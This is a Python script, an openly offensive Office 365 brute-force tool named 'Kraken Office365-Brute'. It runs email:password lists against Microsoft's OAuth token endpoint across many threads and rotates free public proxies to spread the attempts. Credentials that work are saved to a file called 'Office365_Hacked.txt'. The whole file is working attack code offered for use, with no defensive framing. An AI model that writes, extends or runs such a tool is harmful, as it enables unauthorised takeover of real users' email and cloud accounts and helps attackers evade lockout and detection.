import os
import sys
import requests
import logging
from colorama import Fore, Style, init
from random import choice
from threading import Thread, Lock
from queue import Queue
import pyfiglet


init(autoreset=True)


logging.basicConfig(filename=os.path.join('Logs', 'office365_brute.log'),
                    level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


script_dir = os.path.dirname(os.path.abspath(__file__))
results_dir = os.path.join(script_dir, '..', 'Results')
logs_dir = os.path.join(script_dir, '..', 'Logs')
wordlists_dir = os.path.join(script_dir, '..', 'wordlists')


os.makedirs(results_dir, exist_ok=True)
os.makedirs(logs_dir, exist_ok=True)


output_lock = Lock()

def clear_console():
    """Clears the console window."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the script banner with random color."""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = choice(colors)
    banner = pyfiglet.figlet_format("Kraken Office365-Brute", font="slant")
    print(Style.BRIGHT + banner_color + banner)
    print(Style.RESET_ALL + Fore.WHITE + "="*80 + "\n")

def status(msg):
    """Prints status messages."""
    with output_lock:
        print(Fore.CYAN + "[*] " + msg)

def success(msg):
    """Prints success messages."""
    with output_lock:
        print(Fore.GREEN + "[+] " + msg)

def error(msg):
    """Prints error messages."""
    with output_lock:
        print(Fore.RED + "[-] " + msg)

def fetch_proxies():
    """Fetch proxies from ProxyScrape."""
    status("Fetching proxies from ProxyScrape...")
    url = 'https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&proxy_format=protocolipport&format=text'
    try:
        response = requests.get(url)
        proxies = response.text.splitlines()
        success(f"Fetched {len(proxies)} proxies from ProxyScrape.")
        return [{"http": f"http://{proxy}", "https": f"http://{proxy}"} for proxy in proxies]
    except Exception as e:
        error(f"Failed to fetch proxies: {e}")
        sys.exit(1)

class Office365BruteForce:
    def __init__(self):
        clear_console()
        display_banner()

        self.credentials, self.proxy_list, self.num_threads = self.get_user_input()
        self.queue = Queue()
        self.threads = []
        self.total_attempts = len(self.credentials)
        self.attempt_number = 0

        
        for email, password in self.credentials:
            self.queue.put((email, password))

        
        for _ in range(self.num_threads):
            t = Thread(target=self.worker)
            t.start()
            self.threads.append(t)

        
        self.queue.join()

        success("[Completed] All password attempts finished.")

    def get_user_input(self):
        """Gathers user input for the Office 365 brute force operation."""
        credential_file = input(Fore.WHITE + "[i] Enter credentials file (email:password) (default: office365_wordlists.txt, press Enter for default): ").strip() or os.path.join(wordlists_dir, "office365_wordlists.txt")
        status(f"Loading credentials from {credential_file}...")
        if not os.path.isfile(credential_file):
            error(f"Credential file not found: {credential_file}")
            logging.error(f"Credential file not found: {credential_file}")
            sys.exit(1)
        with open(credential_file, 'r', encoding='utf-8') as f:
            credentials = [tuple(line.strip().split(':')) for line in f if line.strip()]
        if not credentials:
            error("No credentials found in the file.")
            logging.error("No credentials found.")
            sys.exit(1)
        success(f"{len(credentials)} credentials loaded from the list.")

        num_threads = int(input(Fore.WHITE + "[i] Enter number of threads to use (default: 10, press Enter for default): ") or 10)

        use_proxy = input(Fore.WHITE + "[i] Do you want to use proxies? (Y/n): ").strip().lower()

        if use_proxy != 'n':
            proxies = fetch_proxies()
        else:
            proxies = None

        status("All inputs received successfully.")
        print(Fore.YELLOW + "-"*60)
        print(Fore.YELLOW + Style.BRIGHT + "Starting brute-force attack...")
        return credentials, proxies, num_threads

    def worker(self):
        """Thread worker function to process the queue."""
        while not self.queue.empty():
            email, password = self.queue.get()
            self.office365_login(email, password)
            self.queue.task_done()

    def office365_login(self, email, password):
        """Attempts to log in to Office 365 using provided credentials."""
        try:
            proxy = choice(self.proxy_list) if self.proxy_list else None  

            sess = requests.session()

            login_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
            data = {
                'client_id': 'your-client-id',  
                'scope': 'https://graph.microsoft.com/.default',
                'grant_type': 'password',
                'username': email,
                'password': password
            }

            self.attempt_number += 1  

            
            response = sess.post(login_url, data=data, timeout=10, proxies=proxy)

            
            if response.status_code == 200 and "access_token" in response.json():
                success_msg = (
                    f"\n[{self.attempt_number}/{self.total_attempts}] Tested - {email}:{password}\n"
                    f"\n{Fore.GREEN + Style.BRIGHT}SUCCESS!{Style.RESET_ALL} Valid credentials found!\n"
                    f"{Fore.YELLOW}{'-'*40}\n"
                    f"Email: {Fore.CYAN}{email}{Style.RESET_ALL}\n"
                    f"Password: {Fore.YELLOW}{password}{Style.RESET_ALL}\n"
                    f"{Fore.YELLOW}{'-'*40}\n"
                )
                sys.stdout.write('\033[K')  
                print(success_msg)
                with open(os.path.join(results_dir, 'Office365_Hacked.txt'), 'a') as writer:
                    writer.write(success_msg)
            else:
                with output_lock:
                    sys.stdout.write(f'\r[{self.attempt_number}/{self.total_attempts}] Tested - Current: {email}:{password}')
                    sys.stdout.flush()

        except requests.exceptions.RequestException as e:
            logging.error(f"Login attempt error: {str(e)}")
            error(f"Login attempt error: {str(e)}")

def main():
    try:
        Office365BruteForce()
    except KeyboardInterrupt:
        logging.info("Script interrupted by user.")
        print(Fore.YELLOW + "Script interrupted by user.")

if __name__ == '__main__':
    main()
